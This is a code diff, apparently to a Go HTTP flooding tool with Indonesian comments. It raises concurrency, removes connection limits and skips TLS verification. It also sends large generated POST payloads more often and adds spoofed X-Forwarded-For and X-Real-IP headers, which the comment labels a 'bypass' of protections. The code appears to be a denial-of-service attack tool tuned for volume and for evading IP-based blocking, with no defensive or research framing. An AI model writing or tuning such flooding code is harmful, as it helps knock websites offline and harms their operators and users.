@@ -33,9 +33,9 @@ const (
 	PUNYAMU        = "\033[38;5;204m"
 	PUNYA_LU_PUCAT = "\033[38;5;218m"
 	MASA_DEPAN_NYA = "\033[97m"
-	Speed          = 8000
+	Speed          = 1500
 	to             = 4 * time.Second
-	MaxConcurrent  = 3000
+	MaxConcurrent  = 1500
 )
 
 type FullProfile struct {
@@ -293,16 +293,16 @@ func main() {
 			Timeout:   5 * time.Second,
 			KeepAlive: 30 * time.Second,
 		}).DialContext,
-		MaxIdleConns:         5000,
-		MaxIdleConnsPerHost:  2500,
-		MaxConnsPerHost:      0,
-		IdleConnTimeout:      300 * time.Second,
-		TLSHandshakeTimeout:  3 * time.Second,
-		ResponseHeaderTimeout: 2 * time.Second,
+		MaxIdleConns:          0,    // unlimited
+		MaxIdleConnsPerHost:   0,    // unlimited
+		MaxConnsPerHost:       0,    // unlimited
+		IdleConnTimeout:       30 * time.Second,
+		TLSHandshakeTimeout:   4 * time.Second,
+		ResponseHeaderTimeout: 4 * time.Second,
 		ExpectContinueTimeout: 0,
-		DisableKeepAlives:    false,
-		DisableCompression:   false,
-		ForceAttemptHTTP2:    true,
+		DisableKeepAlives:     false,
+		DisableCompression:    false,
+		ForceAttemptHTTP2:     true,
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify:     true,
 			NextProtos:             []string{"h2", "http/1.1"},
@@ -483,7 +483,7 @@ func main() {
 
 				var body io.Reader
 				contentType := ""
-				if method == "POST" && rng.Intn(3) == 0 {
+				if method == "POST" && rng.Intn(2) == 0 { // lebih sering POST
 					payloadSize := 100000 + rng.Intn(500000)
 					data, ctype := generateLargePayload(rng, payloadSize)
 					body = bytes.NewReader(data)
@@ -526,6 +526,7 @@ func main() {
 					}
 				}
 
+				// Tambahkan header bypass
 				if rng.Intn(3) == 0 {
 					req.Header.Set("X-Forwarded-For", realIP)
 					req.Header.Set("X-Real-IP", realIP)
